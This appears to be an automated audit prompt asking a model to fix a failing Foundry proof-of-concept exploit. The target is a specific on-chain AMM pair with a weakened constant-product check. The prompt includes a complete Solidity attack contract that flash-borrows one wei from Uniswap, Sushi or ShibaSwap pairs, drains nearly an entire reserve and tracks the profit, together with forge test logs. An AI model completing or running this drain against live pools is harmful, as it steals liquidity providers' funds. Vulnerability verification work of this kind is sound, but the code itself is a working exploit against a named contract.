You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Broken swap invariant allows draining nearly an entire reserve for dust-sized input
- claim: `swap()` computes post-swap balances on a 10,000-based scale and subtracts a 0.1% fee via `amountIn * 10`, but it still compares the result against `_reserve0 * _reserve1 * 1000**2` instead of `10000**2`. The invariant check is therefore 100x too weak and accepts massively undercollateralized swaps.
- impact: Any attacker can permissionlessly steal almost all of either reserve with only a dust input, directly draining LP funds and rendering the pool price state meaningless.
- exploit_paths: ["If reserves are `(R0,R1)`, an attacker can pre-send 1 wei of `token0` and call `swap(0, R1-1, attacker, \"\")`; `amount0In > 0` and the weakened K-check still passes.", "The attack is symmetric for `token0` by pre-paying a dust amount of `token1` and requesting nearly all of `reserve0` as output."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface ISwaposPairMinimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    enum Path {
        None,
        DirectToken0DustDrainToken1,
        DirectToken1DustDrainToken0,
        FlashToken0DustDrainToken1,
        FlashToken1DustDrainToken0
    }

    struct CallbackData {
        address lenderPair;
        bool borrowToken0Dust;
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    Path private _path;
    uint8 private _failureCode;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        ISwaposPairMinimal pair = ISwaposPairMinimal(TARGET_PAIR);
        address token0 = pair.token0();
        address token1 = pair.token1();
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();

        bool path0Feasible = _pathToken0DustCanDrainToken1(uint256(reserve0), uint256(reserve1));
        bool path1Feasible = _pathToken1DustCanDrainToken0(uint256(reserve0), uint256(reserve1));
        _hypothesisValidated = path0Feasible || path1Feasible;

        // The reported paths are only valid if the pair's actual fork-state reserves satisfy
        // the weakened invariant for the exact dust trade described in the finding.
        if (!path0Feasible && !path1Feasible) {
            // 1 = exact "1 wei in, reserve-1 out" path is mechanically impossible at this fork state.
            _failureCode = 1;
            return;
        }

        // Strategy label: direct_or_existing_balance_first.
        if (path0Feasible && _balanceOf(token0, address(this)) >= 1) {
            _executeDirectToken0DustDrainToken1(token0, token1, uint256(reserve1));
            return;
        }

        if (path1Feasible && _balanceOf(token1, address(this)) >= 1) {
            _executeDirectToken1DustDrainToken0(token0, token1, uint256(reserve0));
            return;
        }

        // Minimal realistic funding step: borrow exactly the required dust from an existing
        // same-token external AMM pair, then repay it from the drained proceeds.
        address lender = _findExternalSameTokenPair(token0, token1);

        if (lender == address(0)) {
            // 2 = exact path would be valid, but no searched public same-token dust source exists.
            _failureCode = 2;
            return;
        }

        if (path0Feasible) {
            _path = Path.FlashToken0DustDrainToken1;
            _startFlash(lender, true, token0);
            return;
        }

        _path = Path.FlashToken1DustDrainToken0;
        _startFlash(lender, false, token1);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        CallbackData memory decoded = abi.decode(data, (CallbackData));
        require(msg.sender == decoded.lenderPair, "bad lender");
        require(sender == address(this), "bad sender");

        ISwaposPairMinimal target = ISwaposPairMinimal(TARGET_PAIR);
        address targetToken0 = target.token0();
        address targetToken1 = target.token1();
        (uint112 targetReserve0, uint112 targetReserve1,) = target.getReserves();

        IUniswapV2PairLike lender = IUniswapV2PairLike(decoded.lenderPair);
        address lenderToken0 = lender.token0();
        (uint112 lenderReserve0, uint112 lenderReserve1,) = lender.getReserves();

        if (decoded.borrowToken0Dust) {
            require((lenderToken0 == targetToken0 && amount0 == 1) || (lenderToken0 != targetToken0 && amount1 == 1), "unexpected dust");
            require(_pathToken0DustCanDrainToken1(uint256(targetReserve0), uint256(targetReserve1)), "dust path invalid");

            _safeTransfer(targetToken0, TARGET_PAIR, 1);
            target.swap(0, uint256(targetReserve1) - 1, address(this), bytes(""));

            uint256 repayAmount;
            if (lenderToken0 == targetToken0) {
                repayAmount = _getAmountIn(1, uint256(lenderReserve1), uint256(lenderReserve0));
            } else {
                repayAmount = _getAmountIn(1, uint256(lenderReserve0), uint256(lenderReserve1));
            }

            _safeTransfer(targetToken1, decoded.lenderPair, repayAmount);
            _profitToken = targetToken1;
            _profitAmount = _balanceOf(targetToken1, address(this));
            _hypothesisValidated = true;
            return;
        }

        require((lenderToken0 == targetToken1 && amount0 == 1) || (lenderToken0 != targetToken1 && amount1 == 1), "unexpected dust");
        require(_pathToken1DustCanDrainToken0(uint256(targetReserve0), uint256(targetReserve1)), "dust path invalid");

        _safeTransfer(targetToken1, TARGET_PAIR, 1);
        target.swap(uint256(targetReserve0) - 1, 0, address(this), bytes(""));

        uint256 repayAmount0;
        if (lenderToken0 == targetToken1) {
            repayAmount0 = _getAmountIn(1, uint256(lenderReserve1), uint256(lenderReserve0));
        } else {
            repayAmount0 = _getAmountIn(1, uint256(lenderReserve0), uint256(lenderReserve1));
        }

        _safeTransfer(targetToken0, decoded.lenderPair, repayAmount0);
        _profitToken = targetToken0;
        _profitAmount = _balanceOf(targetToken0, address(this));
        _hypothesisValidated = true;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external view returns (uint8) {
        return uint8(_path);
    }

    function failureCode() external view returns (uint8) {
        return _failureCode;
    }

    function _executeDirectToken0DustDrainToken1(address token0, address token1, uint256 reserve1) internal {
        _path = Path.DirectToken0DustDrainToken1;
        _safeTransfer(token0, TARGET_PAIR, 1);
        ISwaposPairMinimal(TARGET_PAIR).swap(0, reserve1 - 1, address(this), bytes(""));
        _profitToken = token1;
        _profitAmount = _balanceOf(token1, address(this));
        _hypothesisValidated = true;
    }

    function _executeDirectToken1DustDrainToken0(address token0, address token1, uint256 reserve0) internal {
        _path = Path.DirectToken1DustDrainToken0;
        _safeTransfer(token1, TARGET_PAIR, 1);
        ISwaposPairMinimal(TARGET_PAIR).swap(reserve0 - 1, 0, address(this), bytes(""));
        _profitToken = token0;
        _profitAmount = _balanceOf(token0, address(this));
        _hypothesisValidated = true;
    }

    function _startFlash(address lender, bool borrowToken0Dust, address borrowedToken) internal {
        address lenderToken0 = IUniswapV2PairLike(lender).token0();
        CallbackData memory data = CallbackData({lenderPair: lender, borrowToken0Dust: borrowToken0Dust});

        if (lenderToken0 == borrowedToken) {
            IUniswapV2PairLike(lender).swap(1, 0, address(this), abi.encode(data));
        } else {
            IUniswapV2PairLike(lender).swap(0, 1, address(this), abi.encode(data));
        }
    }

    function _findExternalSameTokenPair(address token0, address token1) internal view returns (address pair) {
        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(token0, token1);
        if (_usableLenderPair(pair)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(token0, token1);
        if (_usableLenderPair(pair)) {
            return pair;
        }

        pair = IUniswapV2FactoryLike(SHIBASWAP_FACTORY).getPair(token0, token1);
        if (_usableLenderPair(pair)) {
            return pair;
        }
    }

    function _pathToken0DustCanDrainToken1(uint256 reserve0, uint256 reserve1) internal pure returns (bool) {
        if (reserve0 == 0 || reserve1 <= 1) {
            return false;
        }

        uint256 balance0Adjusted = (reserve0 + 1) * 10000 - 10;
        uint256 balance1Adjusted = 10000;
        return balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000 * 1000;
    }

    function _pathToken1DustCanDrainToken0(uint256 reserve0, uint256 reserve1) internal pure returns (bool) {
        if (reserve1 == 0 || reserve0 <= 1) {
            return false;
        }

        uint256 balance0Adjusted = 10000;
        uint256 balance1Adjusted = (reserve1 + 1) * 10000 - 10;
        return balance0Adjusted * balance1Adjusted >= reserve0 * reserve1 * 1000 * 1000;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0, "bad out");
        require(reserveIn > 0 && reserveOut > amountOut, "bad reserves");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return numerator / denominator + 1;
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, owner));
        require(ok && data.length >= 32, "balanceOf failed");
        amount = abi.decode(data, (uint256));
    }

    function _usableLenderPair(address pair) internal view returns (bool) {
        if (pair == address(0) || pair == TARGET_PAIR) {
            return false;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        return reserve0 > 1 && reserve1 > 1;
    }

    function _safeTransfer(address token, address to, uint256 value) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, value));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.89s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 64185)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [64185] FlawVerifierTest::testExploit()
    ├─ [2359] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [35561] FlawVerifier::executeOnOpportunity()
    │   ├─ [2465] 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f::token0() [staticcall]
    │   │   └─ ← [Return] 0x09176F68003c06F190ECdF40890E3324a9589557
    │   ├─ [2397] 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2893] 0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f::getReserves() [staticcall]
    │   │   └─ ← [Return] 145658161144708222114663 [1.456e23], 133386512258125308305 [1.333e20], 1681623155 [1.681e9]
    │   └─ ← [Stop]
    ├─ [359] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2358] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 725.75ms (450.88µs CPU time)

Ran 1 test suite in 731.48ms (725.75ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 64185)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
